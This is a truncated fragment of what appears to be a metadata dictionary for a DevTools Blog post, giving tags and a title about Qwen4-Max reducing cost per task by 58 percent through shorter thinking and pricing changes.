 'qwen4-max-cost-per-task-2026': {
     'tags': ["Qwen4", "cost engineering", "prefix cache", "MoE"],
     'title': "Qwen4-Max cut cost per task by 58 percent: 67 percent of that came from shorter thinking, 33 percent from the price list | DevTools Blog",
